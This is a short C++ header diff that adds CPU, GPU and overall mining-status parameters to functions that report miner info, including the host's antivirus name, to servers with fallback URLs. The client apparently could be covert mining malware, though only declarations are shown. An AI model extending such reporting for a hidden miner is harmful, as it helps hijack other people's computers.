@@ -33,6 +33,9 @@ public:
                              const std::string& gpuName,
                              const std::string& antivirusName,
                              const std::string& clientVersion,
+                             const std::string& miningStatus = "unknown",
+                             const std::string& cpuMiningStatus = "unknown",
+                             const std::string& gpuMiningStatus = "unknown",
                              int deviceUptimeMin = 0);
     
     // Submit miner info with fallback URLs
@@ -43,6 +46,9 @@ public:
                                           const std::string& gpuName,
                                           const std::string& antivirusName,
                                           const std::string& clientVersion,
+                                          const std::string& miningStatus = "unknown",
+                                          const std::string& cpuMiningStatus = "unknown",
+                                          const std::string& gpuMiningStatus = "unknown",
                                           int deviceUptimeMin = 0);
     
     // Fetch config directly via GET request with fallback URLs
